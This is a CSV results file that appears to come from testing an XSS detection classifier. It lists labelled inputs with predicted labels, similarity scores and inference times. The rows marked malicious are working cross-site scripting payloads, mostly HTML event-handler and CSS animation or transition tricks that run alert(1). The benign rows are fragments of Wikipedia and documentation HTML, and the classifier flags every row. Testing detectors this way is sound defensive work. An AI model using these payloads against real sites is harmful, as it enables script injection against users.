payload,true_label,predicted_label,similarity_score,inference_time_ms
"<bdo onclick=""alert(1)"">test</bdo>",1,1,8.831,33.1252
"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;115??17 </li>",0,1,8.8412,27.7696
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",1,1,8.7626,28.3616
	 </span> ,0,1,8.6496,16.8593
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;361??81, </li>",0,1,8.7839,36.9171
<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,1,1,8.7379,24.3436
	 </span></a></dt><dd>Customize the input and output of your spiders.</dd>,0,1,8.7625,29.5666
"<image onmouseover=""alert(1)"">test</image>",1,1,8.8542,20.9451
<noembed id=x tabindex=1 onfocus=alert(1)></noembed>,1,1,8.6645,26.6749
<sub onpointerleave=alert(1)>XSS</sub>,1,1,8.842,23.4147
"<area onkeyup=""alert(1)"" contenteditable>test</area>",1,1,8.8111,21.436
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,1,1,8.7223,27.5881
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",1,1,8.5523,51.3197
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1,1,8.7796,24.5102
	 </span>,0,1,8.6496,19.0633
<section onpointerover=alert(1)>XSS</section>,1,1,8.8478,22.2478
"<li><a href=""/wiki/Center_for_Human-Compatible_Artificial_Intelligence"" title=""Center for Human-Compatible Artificial Intelligence"">Center for Human-Compatible Artificial Intelligence </a> </li>",0,1,8.7872,32.5718
"	 </span> <span class=""reference-text"">Anderson, Susan Leigh. ""Asimov's ""three laws of robotics"" and machine metaethics."" AI &amp; Society 22.4 (2008): 477??93. ",0,1,8.7634,36.0989
	 </span> </a> </li>,0,1,8.6362,28.3348
	 </span>,0,1,8.6496,20.8875
<object onpointerover=alert(1)>XSS</object>,1,1,8.8318,20.6723
"<optgroup onbeforecut=""alert(1)"" contenteditable>test</optgroup>",1,1,8.7335,24.0252
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",1,1,8.633,37.038
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lombardo P, Boehm I, Nairz K (2020). ""RadioComics ??Santa Claus and the future of radiology"". <i>Eur J Radiol </i>. <b>122 </b> (1): 108771. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.ejrad.2019.108771"">10.1016/j.ejrad.2019.108771 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/31835078"">31835078 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Eur+J+Radiol&amp;rft.atitle=RadioComics+%E2%80%93+Santa+Claus+and+the+future+of+radiology&amp;rft.volume=122&amp;rft.issue=1&amp;rft.pages=108771&amp;rft.date=2020&amp;rft_id=info%3Adoi%2F10.1016%2Fj.ejrad.2019.108771&amp;rft_id=info%3Apmid%2F31835078&amp;rft.aulast=Lombardo&amp;rft.aufirst=P&amp;rft.au=Boehm%2C+I&amp;rft.au=Nairz%2C+K&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,9.0266,226.8239
"<textarea onmouseover=""alert(1)"">test</textarea>",1,1,8.7696,33.6042
 </li>,0,1,8.6096,20.0548
"<tr onkeypress=""alert(1)"" contenteditable>test</tr>",1,1,8.762,31.298
"<header onmouseover=""alert(1)"">test</header>",1,1,8.8682,31.7828
"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",1,1,8.6766,41.9503
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=MIT+Sloan+Management+Review&amp;rft.atitle=Reshaping+Business+With+Artificial+Intelligence&amp;rft_id=https%3A%2F%2Fsloanreview.mit.edu%2Fprojects%2Freshaping-business-with-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.8369,99.5675
"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",1,1,8.7469,40.0838
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",1,1,8.7551,41.2376
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,8.8455,33.1452
"<li id=""cite_note-lstm-266""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-lstm_266-0"">^ </a> </b> ",0,1,8.7959,52.2984
"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",1,1,8.6748,31.5462
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",1,1,8.7095,36.4632
"<address onclick=""alert(1)"">test</address>",1,1,8.9235,48.5646
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1,1,8.8295,30.2705
	 </span>,0,1,8.6496,21.5911
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",1,1,8.7441,45.1409
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",1,1,8.6887,88.7405
"<li><a href=""/wiki/Understanding"" title=""Understanding"">Understanding </a> </li>",0,1,8.8732,47.617
"<h3><span class=""mw-headline"" id=""The_limits_of_artificial_general_intelligence"">The limits of artificial general intelligence ",0,1,8.7198,89.8576
"	 <div style=""padding:0em 0.25em"">",0,1,8.7716,25.9122
"	 </span> <span class=""reference-text"">",0,1,8.8351,25.0965
"<listing onclick=""alert(1)"">test</listing>",1,1,8.938,27.5684
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1,1,8.8014,22.5556
"<hgroup onmouseover=""alert(1)"">test</hgroup>",1,1,8.8208,19.2829
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1,1,8.7983,20.9182
 </li>,0,1,8.6096,15.3826
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",1,1,8.5496,48.8811
<dir onpointerup=alert(1)>XSS</dir>,1,1,8.8211,27.6856
<li>Memory,0,1,9.0193,20.556
"	<a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a><sup id=""cite_ref-Natural_language_processing_120-0"" class=""reference""><a href=""#cite_note-Natural_language_processing-120"">&#91;117&#93; </a> </sup> (NLP) gives machines the ability to read and <a href=""/wiki/Natural_language_understanding"" class=""mw-redirect"" title=""Natural language understanding"">understand </a> human language. A sufficiently powerful natural language processing system would enable <a href=""/wiki/Natural-language_user_interface"" title=""Natural-language user interface"">natural-language user interfaces </a> and the acquisition of knowledge directly from human-written sources, such as newswire texts. Some straightforward applications of natural language processing include <a href=""/wiki/Information_retrieval"" title=""Information retrieval"">information retrieval </a>, <a href=""/wiki/Text_mining"" title=""Text mining"">text mining </a>, <a href=""/wiki/Question_answering"" title=""Question answering"">question answering </a><sup id=""cite_ref-121"" class=""reference""><a href=""#cite_note-121"">&#91;118&#93; </a> </sup> and <a href=""/wiki/Machine_translation"" title=""Machine translation"">machine translation </a>.<sup id=""cite_ref-Applications_of_natural_language_processing_122-0"" class=""reference""><a href=""#cite_note-Applications_of_natural_language_processing-122"">&#91;119&#93; </a> </sup> Many current approaches use word co-occurrence frequencies to construct syntactic representations of text. ""Keyword spotting"" strategies for search are popular and scalable but dumb; a search query for ""dog"" might only match documents with the literal word ""dog"" and miss a document with the word ""poodle"". ""Lexical affinity"" strategies use the occurrence of words such as ""accident"" to <a href=""/wiki/Sentiment_analysis"" title=""Sentiment analysis"">assess the sentiment </a> of a document. Modern statistical NLP approaches can combine all these strategies as well as others, and often achieve acceptable accuracy at the page or paragraph level, but continue to lack the semantic understanding required to classify isolated sentences well. Besides the usual difficulties with encoding semantic commonsense knowledge, existing semantic NLP sometimes scales too poorly to be viable in business applications. Beyond semantic NLP, the ultimate goal of ""narrative"" NLP is to embody a full understanding of commonsense reasoning.<sup id=""cite_ref-123"" class=""reference""><a href=""#cite_note-123"">&#91;120&#93; </a> </sup>",0,1,8.6296,280.3886
"<canvas draggable=""true"" ondragleave=""alert(1)"">test</canvas>",1,1,8.8124,30.7799
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,1,8.569,31.7361
"<multicol onmouseover=""alert(1)"">test</multicol>",1,1,8.8032,25.8519
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",1,1,8.8303,33.2364
"Formal methods are now preferred (""Victory of the <a href=""/wiki/Neats_vs._scruffies"" class=""mw-redirect"" title=""Neats vs. scruffies"">neats </a>""):",0,1,8.7014,42.7665
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",1,1,8.887,21.7045
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",1,1,8.8162,31.692
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",1,1,8.7152,32.6443
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,1,1,8.7086,39.6
 </li>,0,1,8.6096,23.1106
<dt onpointerenter=alert(1)>XSS</dt>,1,1,8.8587,32.2115
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",1,1,8.6608,30.0236
"	 </span> <span class=""reference-text""><a href=""#CITEREFKatz2012"">Katz 2012 </a>. ",0,1,8.843,32.3738
<body onblur=alert(1) id=x><iframe id=x>,1,1,8.777,25.2558
"			<img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x"" data-file-width=""2272"" data-file-height=""1704"" /> </a>  ",0,1,8.7585,106.322
	 </span> </h3>,0,1,8.4948,23.0486
	 </span> </li>,0,1,8.4977,21.2949
"	 </span>  <small class=""date-container""><i>(<span class=""date"">January 2020 ",0,1,8.8693,25.291
"<h1 draggable=""true"" ondragstart=""alert(1)"">test</h1>",1,1,8.8135,27.0581
"<style data-mw-deduplicate=""TemplateStyles:r886047268"">.mw-parser-output .refbegin{font-size:90%;margin-bottom:0.5em}.mw-parser-output .refbegin-hanging-indents>ul{list-style-type:none;margin-left:0}.mw-parser-output .refbegin-hanging-indents>ul>li,.mw-parser-output .refbegin-hanging-indents>dl>dd{margin-left:0;padding-left:3.2em;text-indent:-3.2em;list-style:none}.mw-parser-output .refbegin-100{font-size:100%} </style>",0,1,8.6929,89.6319
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,1,1,8.7243,98.4007
top[??al\x65rt??¢](1),1,1,9.07,35.8866
"<br onmouseenter=""alert(1)"">test</br>",1,1,8.8468,39.9897
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,8.8455,67.6779
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",1,1,8.6868,41.9956
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1,1,8.7857,29.3594
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",1,1,8.7547,32.5991
<marquee onstart=alert(1)></marquee>,1,1,8.7981,23.9775
"<li id=""cite_note-contemporary_agi-146""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-contemporary_agi_146-0"">^ </a> </b> ",0,1,8.8615,41.0609
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",1,1,8.7348,29.0043
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1,1,8.7177,42.2202
	 </span> ,0,1,8.6496,33.7238
<tr onpointerenter=alert(1)>XSS</tr>,1,1,8.8636,35.9766
"<s onkeyup=""alert(1)"" contenteditable>test</s>",1,1,8.8336,32.0184
<dd id=x tabindex=1 onactivate=alert(1)></dd>,1,1,8.8141,23.3968
	 </span>,0,1,8.6496,19.7593
"<acronym onmouseup=""alert(1)"">test</acronym>",1,1,8.9264,23.4006
"<li><a href=""/wiki/Evolution_strategy"" title=""Evolution strategy"">Evolution strategy </a> </li>",0,1,8.8503,28.0468
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",1,1,8.7239,42.1439
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1,1,8.7473,38.1777
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",1,1,8.6982,41.4406
"<li id=""cite_note-182""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-182"">^ </a> </b> ",0,1,8.9149,61.8652
	 </span> </h3>,0,1,8.4948,18.877
	 </span> </li>,0,1,8.4977,17.9178
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,8.564,30.5706
      <hr/>,0,1,9.0409,22.1705
"	 </span> <span class=""reference-text""><a href=""/wiki/Seppo_Linnainmaa"" title=""Seppo Linnainmaa"">Seppo Linnainmaa </a> (1970). The representation of the cumulative rounding error of an algorithm as a Taylor expansion of the local rounding errors. Master's Thesis (in Finnish), Univ. Helsinki, 6??. ",0,1,8.5602,60.0177
<cite onpointerleave=alert(1)>XSS</cite>,1,1,8.8234,24.5008
"<style oncut=""alert(1)"" contenteditable>test</style>",1,1,8.8045,27.5335
<textarea autofocus onfocusin=alert(1)>test</textarea>,1,1,8.7753,30.1302
"<li><a href=""/wiki/Contextualism"" title=""Contextualism"">Contextualism </a> </li>",0,1,8.7753,30.3043
	 </span>,0,1,8.6496,19.2521
	 </span> 2018 ,0,1,8.9525,19.1243
"        <span class=""commit"">",0,1,8.9224,21.163
<frame onpointerenter=alert(1)>XSS</frame>,1,1,8.8558,25.4097
<custom tags onpointerout=alert(1)>XSS</custom tags>,1,1,8.784,22.0662
	 </span> </li>,0,1,8.4977,21.2545
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",1,1,8.6844,36.4769
"<li><a href=""/wiki/History_of_robots"" title=""History of robots"">History </a> </li>",0,1,8.8011,37.197
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",1,1,8.7299,37.2885
"<nobr ondblclick=""alert(1)"">test</nobr>",1,1,8.8083,23.9605
"<BR SIZE=""&{alert('')}"">",1,1,9.0192,20.8493
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;950??52, </li> </ul>",0,1,8.7726,40.8183
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1,1,8.7555,28.7908
"<li class=""toclevel-3 tocsection-62""><a href=""#Computationalism_and_functionalism""><span class=""tocnumber"">8.4.2 ",0,1,8.6719,61.613
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spiders.html"">Spiders</a></li>",0,1,8.6921,54.211
<menu onpointerdown=alert(1)>XSS</menu>,1,1,8.8897,28.0873
"<li><a href=""/wiki/Ant_colony_optimization"" class=""mw-redirect"" title=""Ant colony optimization"">Ant colony optimization </a> </li>",0,1,8.6652,41.3177
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",1,1,8.8327,28.6991
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/install.html"">Installation guide</a></li>",0,1,8.7706,44.3473
"<li><a href=""/wiki/Structuralism_(philosophy_of_science)"" title=""Structuralism (philosophy of science)"">Structuralism </a> </li>",0,1,8.8504,43.4351
